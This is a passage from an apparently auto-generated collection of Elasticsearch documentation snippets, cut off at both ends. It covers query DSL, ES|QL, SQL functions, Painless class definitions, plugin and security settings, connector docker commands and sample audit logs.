elasticsearch-plugins.yml file that installs a custom plugin through an HTTP proxy. The proxy configuration allows specifying an explicit proxy server to use when downloading plugins, overriding the standard Java proxy system properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/manage-plugins-using-configuration-file.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nplugins:\n  - id: custom-mapper\n    location: https://example.com/archive/custom-mapper-1.0.0.zip\nproxy: proxy.example.com:8443\n```\n\n----------------------------------------\n\nTITLE: Span Multi-Term Query with Prefix\nDESCRIPTION: Demonstrates a basic span_multi query using a prefix query to match user IDs starting with 'ki'\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-multi-term-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_multi\": {\n      \"match\": {\n        \"prefix\": { \"user.id\": { \"value\": \"ki\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Bit Vectors with Dot Product in Elasticsearch\nDESCRIPTION: Shows how to perform a search query using the dot product function with bit vectors, demonstrating both byte-array and float-array comparisons.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-bit-vectors/_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\" : {\n        \"match_all\": {}\n      },\n      \"script\": {\n        \"source\": \"dotProduct(params.query_vector, 'my_dense_vector')\",\n        \"params\": {\n          \"query_vector\": [8, 5, -15, 1, -7]\n        }\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-bit-vectors/_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\" : {\n        \"match_all\": {}\n      },\n      \"script\": {\n        \"source\": \"dotProduct(params.query_vector, 'my_dense_vector')\",\n        \"params\": {\n          \"query_vector\": [0.23, 1.45, 3.67, 4.89, -0.56, 2.34, 3.21, 1.78, -2.45, 0.98, -0.12, 3.45, 4.56, 2.78, 1.23, 0.67, 3.89, 4.12, -2.34, 1.56, 0.78, 3.21, 4.12, 2.45, -1.67, 0.34, -3.45, 4.56, -2.78, 1.23, -0.67, 3.89, -4.34, 2.12, -1.56, 0.78, -3.21, 4.45, 2.12, 1.67]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Listing Elasticsearch Test Coverage Gaps\nDESCRIPTION: This snippet lists specific areas of Elasticsearch that are missing test coverage. It highlights 'consistency' and 'timeout' as key areas needing attention for improved test coverage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/src/yamlRestTest/resources/rest-api-spec/test/delete/TODO.txt#2025-04-22_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n# consistency\n# timeout\n```\n\n----------------------------------------\n\nTITLE: Security Exception Example for Reroute Processor\nDESCRIPTION: Example of a security exception message when the client lacks necessary permissions for the target index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/reroute-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"security_exception\",\"reason\":\"action [indices:admin/auto_create] is unauthorized for API key id [8-dt9H8BqGblnY2uSI--] of user [elastic/fleet-server] on indices [logs-foo-default], this action is granted by the index privileges [auto_configure,create_index,manage,all]\"}\n```\n\n----------------------------------------\n\nTITLE: CSV-SPEC Test with Tagged Regions\nDESCRIPTION: Demonstrates how to create CSV-SPEC tests with tagged regions for documentation generation, including test query and expected results\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/testFixtures/src/main/resources/README.md#2025-04-21_snippet_2\n\nLANGUAGE: csv-spec\nCODE:\n```\nsin\n// tag::sin[]\nROW a=1.8\n| EVAL sin=SIN(a)\n// end::sin[]\n;\n\n// tag::sin-result[]\na:double | sin:double\n     1.8 | 0.9738476308781951\n// end::sin-result[]\n;\n```\n\n----------------------------------------\n\nTITLE: Running a Specific Query\nDESCRIPTION: This command runs a specific query from the EQL correctness test suite by specifying the query number from `queries.toml`. This is useful for targeted testing of individual queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew ':x-pack:plugin:eql:qa:correctness:javaRestTest' --tests \"org.elasticsearch.xpack.eql.EsEQLCorrectnessIT.test {<queryNo>}\"\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL AbstractFunctionTestCase Parameter in Markdown\nDESCRIPTION: This snippet defines the 'field' parameter for an ESQL AbstractFunctionTestCase. It specifies that the field is a multivalue expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_last.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Multivalue expression.\n```\n\n----------------------------------------\n\nTITLE: SQL Example of VAR_SAMP Function Usage\nDESCRIPTION: This SQL example retrieves the minimum salary, maximum salary, and the sample variance of salaries from the 'emp' table using the VAR_SAMP function.  The result displays these three calculated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_25\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSELECT MIN(salary) AS min, MAX(salary) AS max, VAR_SAMP(salary) AS varsamp FROM emp;\n\n      min      |      max      |     varsamp\n---------------+---------------+----------------\n25324          |74999          |1.913926061691E8\n```\n```\n\n----------------------------------------\n\nTITLE: Creating ZIP Archive of Elasticsearch Snapshots in Bash\nDESCRIPTION: Compresses the Elasticsearch snapshots directory into a ZIP file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\nzip -r snapshot.zip /tmp/sharedESData/snapshots/*\n```\n\n----------------------------------------\n\nTITLE: Explaining Document Goals Field Using Debug.explain\nDESCRIPTION: Demonstrates using Debug.explain to inspect the type and content of the goals field in a script query context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-debugging.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /hockey/_explain/1\n{\n  \"query\": {\n    \"script\": {\n      \"script\": \"Debug.explain(doc.goals)\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: INTERVAL Operator Examples\nDESCRIPTION: Examples showing the angle bracket operators which match numeric ranges, available when the INTERVAL flag is enabled.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_15\n\nLANGUAGE: text\nCODE:\n```\nfoo<1-100>      # matches 'foo1', 'foo2' ... 'foo99', 'foo100'\nfoo<01-100>     # matches 'foo01', 'foo02' ... 'foo99', 'foo100'\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Styles Elements Group in Elasticsearch YAML\nDESCRIPTION: Includes the style attribute on all elements in the sanitization configuration. CSS attributes are also sanitized to prevent XSS attacks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\n_styles\n```\n\n----------------------------------------\n\nTITLE: Describing Approximate Count Distinct Function in ESQL\nDESCRIPTION: This code snippet provides a description of the approximate count distinct function in ESQL. It explains that the function returns the approximate number of distinct values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: SQL\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns the approximate number of distinct values.\n```\n\n----------------------------------------\n\nTITLE: SHOW FUNCTIONS Basic Syntax in Elasticsearch SQL\nDESCRIPTION: The basic syntax for the SHOW FUNCTIONS command in Elasticsearch SQL. The optional LIKE clause can be used with a pattern to filter the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-functions.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSHOW FUNCTIONS [LIKE pattern]?\n```\n\n----------------------------------------\n\nTITLE: Defining LocalDate Class\nDESCRIPTION: This code snippet defines the `java.time.LocalDate` class, including methods for creating, manipulating, and querying local dates. The methods cover functionalities such as conversions to other date/time types, calculations (plus/minus days, months, years), and extraction of date components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.LocalDate {\\n  LocalDate MAX\\n  LocalDate MIN\\n  LocalDateTime atStartOfDay()\\n  ZonedDateTime atStartOfDay(ZoneId)\\n  LocalDateTime atTime(LocalTime)\\n  LocalDateTime atTime(int,int)\\n  LocalDateTime atTime(int,int,int)\\n  LocalDateTime atTime(int,int,int,int)\\n  LocalDate from(TemporalAccessor)\\n  IsoChronology getChronology()\\n  int getDayOfMonth()\\n  DayOfWeek getDayOfWeek()\\n  int getDayOfYear()\\n  Month getMonth()\\n  int getMonthValue()\\n  int getYear()\\n  LocalDate minus(TemporalAmount)\\n  LocalDate minus(long,TemporalUnit)\\n  LocalDate minusYears(long)\\n  LocalDate minusMonths(long)\\n  LocalDate minusWeeks(long)\\n  LocalDate minusDays(long)\\n  LocalDate of(int,int,int)\\n  LocalDate ofYearDay(int,int)\\n  LocalDate ofEpochDay(long)\\n  LocalDate parse(CharSequence)\\n  LocalDate parse(CharSequence,DateTimeFormatter)\\n  LocalDate plus(TemporalAmount)\\n  LocalDate plus(long,TemporalUnit)\\n  LocalDate plusYears(long)\\n  LocalDate plusMonths(long)\\n  LocalDate plusWeeks(long)\\n  LocalDate plusDays(long)\\n  Period until(ChronoLocalDate)\\n  LocalDate with(TemporalAdjuster)\\n  LocalDate with(TemporalField,long)\\n  LocalDate withDayOfMonth(int)\\n  LocalDate withDayOfYear(int)\\n  LocalDate withMonth(int)\\n  LocalDate withYear(int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Filtering Employee Names with RLIKE Operator in ESQL\nDESCRIPTION: This ESQL query filters employees whose first names match the regular expression pattern '.leja.*'. It then keeps only the first_name and last_name columns in the result set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/rlike.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE first_name RLIKE \"\\\".leja.*\\\"\"\n| KEEP first_name, last_name\n```\n\n----------------------------------------\n\nTITLE: Configuring Truststore Path for Remote Cluster Server SSL in Elasticsearch\nDESCRIPTION: Setting for specifying the path to the truststore containing certificates to trust for remote cluster server SSL connections. Cannot be used simultaneously with certificate_authorities setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_35\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.truststore.path\n```\n\n----------------------------------------\n\nTITLE: RRF Score Calculation with rank_window_size=2\nDESCRIPTION: Python-like example showing RRF score calculations when rank_window_size=2, which limits visible documents from each query. Demonstrates how this changes the final ranking and pagination capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_14\n\nLANGUAGE: python\nCODE:\n```\n# doc   | queryA     | queryB         | score\n_id: 1 =  1.0/(1+1)  + 0              = 0.5\n_id: 2 =  1.0/(1+2)  + 0              = 0.33\n_id: 4 =    0        + 1.0/(1+2)      = 0.33\n_id: 5 =    0        + 1.0/(1+1)      = 0.5\n```\n\n----------------------------------------\n\nTITLE: Logging change_apikeys Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the bulk update API keys event. This event is logged when the API is invoked to update attributes of multiple existing API keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\",\"timestamp\":\"2020-12-31T00:33:52,521+0200\",\"node.id\":\n\"9clhpgjJRR-iKzOw20xBNQ\",\"event.type\":\"security_config_change\",\n\"event.action\":\"change_apikeys\",\"request.id\":\"9FteCmovTzWHVI-9Gpa_vQ\",\n\"change\":{\"apikeys\":\n{\"ids\":[\"zcwN3YEBBmnjw-K-hW5_\",\"j7c0WYIBqecB5CbVR6Oq\"],\"role_descriptors\":\n[{\"cluster\":[\"monitor\",\"manage_ilm\"],\"indices\":[{\"names\":[\"index-a*\"],\"privileges\":\n[\"read\",\"maintenance\"]},{\"names\":[\"in*\",\"alias*\"],\"privileges\":[\"read\"],\n\"field_security\":{\"grant\":[\"field1*\",\"@timestamp\"],\"except\":[\"field11\"]}}],\n\"applications\":[],\"run_as\":[]},{\"cluster\":[\"all\"],\"indices\":[{\"names\":\n[\"index-b*\"],\"privileges\":[\"all\"]}],\"applications\":[],\"run_as\":[]}],\n\"metadata\":{\"application\":\"my-application\",\"environment\":{\"level\":1,\n\"tags\":[\"dev\",\"staging\"]}},\"expiration\":\"10d\"}}}\n```\n\n----------------------------------------\n\nTITLE: Creating an index with flat vector type in Elasticsearch\nDESCRIPTION: Creates an Elasticsearch index with a dense_vector field using the 'flat' type, which stores vectors as raw float32 arrays. This type can later be updated to more efficient types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n    \"mappings\": {\n        \"properties\": {\n            \"text_embedding\": {\n                \"type\": \"dense_vector\",\n                \"dims\": 384,\n                \"index_options\": {\n                    \"type\": \"flat\"\n                }\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Conversion Support Matrix\nDESCRIPTION: Markdown table showing supported field types that can be converted to integer type results. This mapping table is auto-generated by ESQL's AbstractFunctionTestCase and should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_integer.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | integer |\n| counter_integer | integer |\n| date | integer |\n| double | integer |\n| integer | integer |\n| keyword | integer |\n| long | integer |\n| text | integer |\n| unsigned_long | integer |\n```\n\n----------------------------------------\n\nTITLE: Running Docker Image for Connector Service\nDESCRIPTION: This snippet provides a command to run the Docker image of the Microsoft SQL connector service, specifying volume mounts and network configurations necessary for proper operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n\"docker run \\\\n-v ~/connectors-config:/config \\\\n--network \\\"elastic\\\" \\\\n--tty \\\\n--rm \\\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\\n/app/bin/elastic-ingest \\\\n-c /config/config.yml\"\n```\n\n----------------------------------------\n\nTITLE: Using ASCII Folding Filter with Analyze API in Elasticsearch\nDESCRIPTION: Example of using the asciifolding filter with the analyze API to convert characters with diacritical marks to their ASCII equivalents. This request processes the text 'açaí à la carte' and removes the diacritical marks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-asciifolding-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"asciifolding\"],\n  \"text\" : \"açaí à la carte\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using EXP Function in Elasticsearch SQL\nDESCRIPTION: Returns Euler's number raised to the power of the input numeric expression (e^x). The function takes a float input and returns a double value. If null is provided, it returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nEXP(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Defining ZoneOffsetTransitionRule Class Methods\nDESCRIPTION: Specifies the structure and methods of the ZoneOffsetTransitionRule class for defining rules of time zone offset transitions. Includes methods for creating transitions and accessing rule properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.zone.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.zone.ZoneOffsetTransitionRule {\n  ZoneOffsetTransition createTransition(int)\n  int getDayOfMonthIndicator()\n  DayOfWeek getDayOfWeek()\n  LocalTime getLocalTime()\n  Month getMonth()\n  ZoneOffset getOffsetAfter()\n  ZoneOffset getOffsetBefore()\n  ZoneOffset getStandardOffset()\n  ZoneOffsetTransitionRule.TimeDefinition getTimeDefinition()\n  boolean isMidnightEndOfDay()\n  ZoneOffsetTransitionRule of(Month,int,DayOfWeek,LocalTime,boolean,ZoneOffsetTransitionRule.TimeDefinition,ZoneOffset,ZoneOffset,ZoneOffset)\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring DateFieldScript Class for Painless in Elasticsearch\nDESCRIPTION: Declares the `org.elasticsearch.script.DateFieldScript` class and its `Factory` inner class.  The `@no_import` annotation prevents direct import of these classes, forcing interaction via whitelisted methods.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.date_field.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.script.DateFieldScript @no_import {\n}\nclass org.elasticsearch.script.DateFieldScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Aggregation with Custom Time Zone in Elasticsearch\nDESCRIPTION: This example demonstrates how specifying a custom time zone in a date histogram aggregation affects the bucketing of documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"by_day\": {\n      \"date_histogram\": {\n        \"field\":     \"date\",\n        \"calendar_interval\":  \"day\",\n        \"time_zone\": \"-01:00\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"by_day\": {\n      \"buckets\": [\n        {\n          \"key_as_string\": \"2015-09-30T00:00:00.000-01:00\",\n          \"key\": 1443574800000,\n          \"doc_count\": 1\n        },\n        {\n          \"key_as_string\": \"2015-10-01T00:00:00.000-01:00\",\n          \"key\": 1443661200000,\n          \"doc_count\": 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using GREATEST Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the GREATEST function in ESQL to return the maximum value from multiple columns. It creates a row with two values and then evaluates the greatest of them.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/greatest.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 10, b = 20\n| EVAL g = GREATEST(a, b)\n```\n\n----------------------------------------\n\nTITLE: Holt Double Exponential Implementation\nDESCRIPTION: Double exponential smoothing that incorporates trend tracking with configurable alpha and beta parameters for level and trend decay.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_movavg\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.holt(values, 0.3, 0.1)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CBRT Function in Elasticsearch SQL\nDESCRIPTION: Returns the cube root of a numeric expression. The function takes a numeric input and returns a double value. If null is provided, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCBRT(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Compression Configuration Query\nDESCRIPTION: Query demonstrating how to configure TDigest compression parameter to balance memory usage and accuracy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": \"load_time\",\n        \"tdigest\": {\n          \"compression\": 200\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Parameters for IP Address Manipulation in ESQL\nDESCRIPTION: This snippet outlines the parameters used in an ESQL function for IP address manipulation. It includes an IP address parameter and separate prefix length parameters for IPv4 and IPv6 addresses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/ip_prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`ip`\n:   IP address of type `ip` (both IPv4 and IPv6 are supported).\n\n`prefixLengthV4`\n:   Prefix length for IPv4 addresses.\n\n`prefixLengthV6`\n:   Prefix length for IPv6 addresses.\n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Sine with SINH Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the SINH function in ESQL to calculate the hyperbolic sine of a numeric value. The example creates a row with a double value and applies SINH to it, returning the calculated result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/sinh.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL sinh=SINH(a)\n```\n\n----------------------------------------\n\nTITLE: Indexing Document with Version Field Values\nDESCRIPTION: This snippet shows how to index a document with multiple version values in the 'versions' field. It demonstrates inserting an array of version strings, including pre-release versions and duplicates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/version.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT idx/_doc/1\n{\n  \"versions\": [\"8.0.0-beta1\", \"8.5.0\", \"0.90.12\", \"2.6.1\", \"1.3.4\", \"1.3.4\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template for Employers\nDESCRIPTION: A sample copyright disclaimer for employers or institutions to sign, disclaiming copyright interest in a program. This template would be used when a programmer needs their employer to formally relinquish copyright claims.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-NOTICE.txt#2025-04-21_snippet_6\n\nLANGUAGE: plaintext\nCODE:\n```\n    Yoyodyne, Inc., hereby disclaims all copyright interest in the\n    program `Gnomovision' (which makes passes at compilers) written by\n    James Hacker.\n\n    signature of Ty Coon, 1 April 1989\n    Ty Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Using Fingerprint Processor in Elasticsearch Pipeline Simulation\nDESCRIPTION: This example demonstrates how to use the fingerprint processor to hash user data in an Elasticsearch ingest pipeline. The processor is configured to hash the 'user' field containing personal information like name, date of birth, and activity status.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/fingerprint-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"fingerprint\": {\n          \"fields\": [\"user\"]\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"user\": {\n          \"last_name\": \"Smith\",\n          \"first_name\": \"John\",\n          \"date_of_birth\": \"1980-01-15\",\n          \"is_active\": true\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Standard Deviation Bounds in Extended Stats\nDESCRIPTION: Shows how to customize the standard deviation bounds by specifying a sigma value to control the number of standard deviations from the mean.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-extendedstats-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /exams/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"grades_stats\": {\n      \"extended_stats\": {\n        \"field\": \"grade\",\n        \"sigma\": 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License Header Template\nDESCRIPTION: Boilerplate notice template for applying the Apache License to a work. This template should be customized with appropriate copyright year and owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-xml-module-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Output of CamelCase Tokenizer\nDESCRIPTION: This example shows the output of the configured CamelCase tokenizer. The words in the sample text are split based on upper and lower case letters and numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n[ moose, x, ftp, class, 2, beta ]\n```\n\n----------------------------------------\n\nTITLE: Example Document Structure for Composite Aggregation\nDESCRIPTION: Sample document structure showing how composite buckets are created from combinations of field values. This example demonstrates how a document with multiple keywords and numbers generates multiple composite buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"keyword\": [\"foo\", \"bar\"],\n  \"number\": [23, 65, 76]\n}\n```\n\n----------------------------------------\n\nTITLE: With Runs Using By Keyword\nDESCRIPTION: Example showing how to combine 'with runs' statement with the 'by' keyword.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_23\n\nLANGUAGE: eql\nCODE:\n```\nsequence\n  [ process where event.type == \"creation\" ] by process.executable\n  [ library where process.name == \"regsvr32.exe\" ] by dll.path with runs=3\n```\n\n----------------------------------------\n\nTITLE: Running ServiceNow Connector Docker Image\nDESCRIPTION: Docker command to run the Elastic Connectors service with the specified configuration file and network settings\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: REST Endpoint URL Examples in Elasticsearch\nDESCRIPTION: Examples showing Elasticsearch's convention of using singular nouns rather than plurals in REST API endpoints. The recommended format uses singular forms like '/_ingest/pipeline' and '/_ingest/pipeline/{id}' rather than plural forms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n/_ingest/pipeline\n/_ingest/pipeline/{id}\n```\n\n----------------------------------------\n\nTITLE: Querying with Custom Background Context in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use a custom background filter in a significant_text aggregation. It focuses on finding significant terms related to 'madrid' within the context of documents containing 'spain'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET news/_search\n{\n  \"query\": {\n    \"match\": {\n      \"content\": \"madrid\"\n    }\n  },\n  \"aggs\": {\n    \"tags\": {\n      \"significant_text\": {\n        \"field\": \"content\",\n        \"background_filter\": {\n          \"term\": { \"content\": \"spain\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Suggestions Using Shorthand Array Syntax\nDESCRIPTION: Example demonstrating the shorthand form for indexing multiple suggestion inputs as a simple array. This simplified syntax cannot specify weights for individual suggestions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nPUT music/_doc/1?refresh\n{\n  \"suggest\" : [ \"Nevermind\", \"Nirvana\" ]\n}\n```\n\n----------------------------------------\n\nTITLE: Static Importing Method from Another Class\nDESCRIPTION: This snippet demonstrates how to perform a static import within the Painless environment to access a method from another class. It outlines the structure for importing and utilizing class methods in a type-safe manner.\nSOURCE: 